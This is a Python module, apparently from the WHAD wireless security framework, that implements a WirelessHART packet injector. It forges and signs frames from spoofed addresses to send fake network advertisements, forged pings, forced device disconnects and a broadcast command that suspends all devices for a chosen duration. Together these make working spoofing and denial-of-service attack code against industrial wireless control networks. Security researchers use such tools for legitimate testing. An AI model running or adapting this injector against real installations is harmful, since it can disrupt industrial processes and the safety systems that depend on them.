from whad.dot15d4.utils.tsch import Network
from whad.wihart.connector import WirelessHart
from whad.wihart.crypto import KeyStore, WirelessHartEncryptor, \
        compute_dlmic, WirelessHartNetworkLayerCryptoManager
from whad.scapy.layers.wirelesshart import WirelessHart_Command_Response_Hdr, WirelessHart_Network_Security_SubLayer_Hdr, \
    WirelessHart_DataLink_Advertisement, WirelessHart_Transport_Layer_Hdr, \
    WirelessHart_DataLink_Advertisement, WirelessHart_DataLink_Hdr, WirelessHart_Disconnect_Device_Request, WirelessHart_Network_Hdr,\
    WirelessHart_Network_Security_SubLayer_Hdr, WirelessHart_Suspend_Devices_Request, WirelessHart_Transport_Layer_Hdr, \
    WirelessHart_Vendor_Specific_Dust_Networks_Ping_Request, WirelessHart_Vendor_Specific_Dust_Networks_Ping_Response, WirelessHart_Command_Request_Hdr
from scapy.layers.dot15d4 import Dot15d4Data, Dot15d4FCS
from whad.dot15d4.utils.phy import ChannelMap
from whad.hub.dot15d4 import LinkOptions, LinkType
from scapy.packet import Packet
from whad.wihart.exceptions import MissingCryptographicMaterial



class Injector(WirelessHart):
    """
    WirelessHART Injector interface for WHAD devices
    """

    def __init__(self, device, store : KeyStore = None, network : Network = None):
        WirelessHart.__init__(self, device)

        if store is None :
            store = KeyStore()

        self.__encryptor = WirelessHartEncryptor(store) 

        if network is not None : 
            self.network = network

    @property
    def network(self):
        return self._Dot15d4__tsch_network

    @network.setter
    def network(self, value):
        self._Dot15d4__tsch_network = value

    @property
    def encryptor(self):
        return self.__encryptor
    
    def get_asn_to_send(self, src, dst, link_type, link_options, force_next_sf: bool = True, asn_offset: int = 200):
        current_asn = self.network.asn
        (sf, link) = self.network.get_link(src, dst, link_type=link_type, options=link_options)
        if sf is None or link is None:
            raise Exception(f"No link found for src={dst}, dst=0xFFFF, link_type={link_type}, link_options={link_options}")  

        # If the current ASN is greater than the link's time slot, we need to force the next superframe to ensure the packet is sent in the correct time slot.
        if (current_asn % sf.number_of_slots) > link.time_slot:
            force_next_sf = True
        else:
            asn_to_send = current_asn - (current_asn % sf.number_of_slots) + link.time_slot

        # Calculate the ASN for the next superframe
        if force_next_sf:
            asn_to_send = (((current_asn + asn_offset) // sf.number_of_slots) + 1) * sf.number_of_slots + link.time_slot
        return asn_to_send

    def _send_wihart_frame(
        self, 
        dst: int, 
        commands: list, 
        spoofed_src: int = 0x0001, 
        graph: int = 0x0001, 
        link_type: int = LinkType.BROADCAST,
        link_options: int = LinkOptions.RECEIVE,
        is_broadcast_crypto: bool = False,
        asn_offset: int = 200,
        force_next_sf: bool = True,
        nwk_src_addr: int = 0xf980,
        nwk_dest_addr: int = None,
        first_src_route_segment: int = 0,
        first_route_segment: list = None,
        wait_offset: int = 2200
    ) -> Packet:

        asn_to_send = self.get_asn_to_send(dst, 0xFFFF, link_type=link_type, link_options=link_options, force_next_sf=force_next_sf, asn_offset=asn_offset)

        if is_broadcast_crypto:
            key = self.__encryptor.get_broadcast_session_key(0xf980, 0xffff)
            peer = self.__encryptor.get_broadcast_peer(0xf980, 0xffff)
            target_nwk_dst = 0xffff
            nonce_counter = (peer.get_nonce_counter() + 1) % 256 if peer else 1
        else:
            target_nwk_dst = nwk_dest_addr if nwk_dest_addr is not None else dst
            key = self.__encryptor.get_unicast_session_key(0xf980, dst)
            peer = self.__encryptor.get_unicast_peer(0xf980, dst)
            if peer:
                peer.increment_nonce()
                nonce_counter = peer.get_nonce_counter() % 256
            else:
                nonce_counter = 1


        if not key:
            raise MissingCryptographicMaterial()

        transport_layer = WirelessHart_Transport_Layer_Hdr(
            acknowledged=1 if is_broadcast_crypto else 0,
            response=1 if first_src_route_segment else 0,
            broadcast=1 if is_broadcast_crypto else 0,
            tr_seq_num=31,
            commands=commands
        )

        network_layer = WirelessHart_Network_Hdr(
            nwk_dest_addr_length=0, nwk_src_addr_length=0, proxy_route=0,
            second_src_route_segment=0, 
            first_src_route_segment=first_src_route_segment, 
            ttl=0,
            asn_snippet=(asn_to_send & 0xffff ) - 1,
            graph_id=graph,
            nwk_dest_addr=target_nwk_dst,
            nwk_src_addr=nwk_src_addr,
        )
        
        if first_route_segment is not None:
            network_layer.first_route_segment = first_route_segment

        security_sub_layer = WirelessHart_Network_Security_SubLayer_Hdr(
            security_types=0, counter=nonce_counter, nwk_mic=0
        )
        
        data_link_layer = WirelessHart_DataLink_Hdr(
            reserved=0, priority=3, network_key_use=1, pdu_type=7, mic=0x0
        )
        
        dot15d4_data = Dot15d4Data(
            dest_panid=self.network.panid,
            dest_addr=dst, 
            src_addr=spoofed_src
        )
        
        dot15d4_fcs = Dot15d4FCS(
            fcf_panidcompress=True, fcf_ackreq=False, fcf_pending=False, fcf_security=False,
            fcf_frametype=1, fcf_srcaddrmode=2, fcf_framever=0, fcf_destaddrmode=2,
            seqnum=asn_to_send % 256
        )

        packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer / transport_layer
        manager = WirelessHartNetworkLayerCryptoManager(key)
        manager.nonce = manager.generateNonce(packet)
        
        security_sub_layer.nonce = 0x0
        packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer / transport_layer
        
        enciphered, nwk_mic = manager.encrypt(bytes(transport_layer), manager.generateAuth(packet))
        
        security_sub_layer.nwk_mic = int.from_bytes(nwk_mic)
        security_sub_layer.counter = nonce_counter
        network_layer.ttl = 126
        
        packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer / enciphered
        dl_mic = compute_dlmic(packet, self.__encryptor.get_network_key(), asn_to_send)
        data_link_layer.mic = int.from_bytes(dl_mic)
        
        final_packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer / enciphered

        self.send_in_slot(final_packet, asn_to_send, wait_offset=wait_offset)
        return final_packet

    def send_fake_advertisement(
            self, 
            dst: int = 0xffff, 
            graph: int = 0x0001, 
            spoofed_src: int = 0x0001, 
            wait_offset: int = 2200, 
            channel_map = None, 
            superframes: list = None, 
            link_type: int = LinkType.BROADCAST, 
            link_options: int = LinkOptions.RECEIVE
    ) -> Packet:
        
        # get the slot number on which we will inject packet
        asn_to_send = self.get_asn_to_send(dst, 0xFFFF, link_type=link_type, link_options=link_options)

        # get channel map
        if channel_map is None :
            if self.network.channel_map is not None:
                channel_map = self.network.channel_map
            else : 
                raise Exception("Channel map neither specified nor saved in network configuration")
        else :
            channel_map = ChannelMap(channel_map)

        # get superframes advertised
        if superframes is None : 
            superframes = list(self.network.superframes.bytes)


        adv = WirelessHart_DataLink_Advertisement(
            asn=asn_to_send,
            security_level_supported="join_keyed",
            join_priority=1,
            channel_count=15,
            channel_map=channel_map.bytes,
            graph_id=graph,
            superframes=[sf.to_pkt() for sf in superframes]
        )

        data_link_layer = WirelessHart_DataLink_Hdr(
            reserved=0, priority=3, network_key_use=0, pdu_type=1, mic=0x0
        )

        dot15d4_data = Dot15d4Data(
            dest_panid=self.network.panid,
            dest_addr=dst, 
            src_addr=spoofed_src
        )

        dot15d4_fcs = Dot15d4FCS(
            fcf_panidcompress=True, fcf_ackreq=False, fcf_pending=False, fcf_security=False,
            fcf_frametype=1, fcf_srcaddrmode=2, fcf_framever=0, fcf_destaddrmode=2,
            seqnum=asn_to_send % 256
        )

        packet = dot15d4_fcs / dot15d4_data / data_link_layer / adv

        dl_mic = compute_dlmic(packet, self.__encryptor.get_wellknown_key(), asn_to_send)
        
        data_link_layer.mic = int.from_bytes(dl_mic)

        final_packet = dot15d4_fcs / dot15d4_data / data_link_layer / adv

        self.send_in_slot(final_packet, asn_to_send, wait_offset=wait_offset)
        
        return final_packet

    def send_keep_alive(self, src, dst, wait_offset : int = 2200):
        asn_to_send = self.get_asn_to_send(dst, 0xffff, LinkType.BROADCAST, LinkOptions.RECEIVE)
        
        data_link_layer = WirelessHart_DataLink_Hdr(
            reserved=0, priority=3, network_key_use=1, pdu_type=2, mic=0x0
        )

        dot15d4_data = Dot15d4Data(
            dest_panid=self.network.panid,
            dest_addr=dst, 
            src_addr=src
        )

        dot15d4_fcs = Dot15d4FCS(
            fcf_panidcompress=True, fcf_ackreq=False, fcf_pending=False, fcf_security=False,
            fcf_frametype=1, fcf_srcaddrmode=2, fcf_framever=0, fcf_destaddrmode=2,
            seqnum=asn_to_send % 256
        )

        packet = dot15d4_fcs / dot15d4_data / data_link_layer
        
        dl_mic = compute_dlmic(packet, self.__encryptor.get_network_key(), asn_to_send)
        
        data_link_layer.mic = int.from_bytes(dl_mic)

        final_packet = dot15d4_fcs / dot15d4_data / data_link_layer

        self.send_in_slot(final_packet, asn_to_send, wait_offset=wait_offset)
        
        return final_packet

    def ping_request(self, dst: int, spoofed_src: int = 0x0001, graph: int = 0x0001, wait_offset: int = 2200):
        req = WirelessHart_Command_Request_Hdr(command_number=0xfc04, len=4) / \
              WirelessHart_Vendor_Specific_Dust_Networks_Ping_Request(expanded_device_type=0xe0a2, hops=1)
        return self._send_wihart_frame(
            dst=dst, commands=[req], spoofed_src=spoofed_src, graph=graph,
            link_type=LinkType.BROADCAST, link_options=LinkOptions.RECEIVE, asn_offset=200, wait_offset=wait_offset
        )

    def ping_response(self, src: int, dst_dl: int, graph: int = 0x0001, hops: int = 1):   
        resp = WirelessHart_Command_Response_Hdr(command_number=0xfc05, len=9) / \
               WirelessHart_Vendor_Specific_Dust_Networks_Ping_Response(
                   status=0, expanded_device_type=0xe0a2, hops=hops, temperature=1, voltage=2700
               )
        return self._send_wihart_frame(
            dst=dst_dl, commands=[resp], spoofed_src=src, graph=graph,
            link_type=LinkType.BROADCAST, link_options=LinkOptions.RECEIVE, asn_offset=1000, 
            nwk_src_addr=src, nwk_dest_addr=0xf980,
            first_src_route_segment=1, first_route_segment=[src, 0x0001, 0xffff, 0xffff]
        )

    def disconnect_device(self, dst: int, graph: int = 0x0001):
        cmd = WirelessHart_Command_Request_Hdr(command_number=960, len=1) / \
              WirelessHart_Disconnect_Device_Request(reason="User-initialized")
        return self._send_wihart_frame(
            dst=dst, commands=[cmd], spoofed_src=0x0001, graph=graph,
            link_type=LinkType.BROADCAST, link_options=LinkOptions.RECEIVE, force_next_sf=False
        )

    def mass_de_authetication_packet(self, dst: int, duration: int, wait_before_suspend: int = 1000, graph: int = 0x0001, src: int = 0x0001):
        current_asn = self.network.asn if (self.network is not None and self.network.asn is not None) else 0
        est_asn = current_asn + 200
        
        cmd = WirelessHart_Command_Request_Hdr(command_number=972, len=10) / \
              WirelessHart_Suspend_Devices_Request(
                  asn_suspend=est_asn + wait_before_suspend,
                  asn_resume=est_asn + wait_before_suspend + duration
              )
        return self._send_wihart_frame(
            dst=dst, commands=[cmd], spoofed_src=src, graph=graph,
            link_type=LinkType.BROADCAST, link_options=LinkOptions.RECEIVE,
            is_broadcast_crypto=True, asn_offset=200
        )
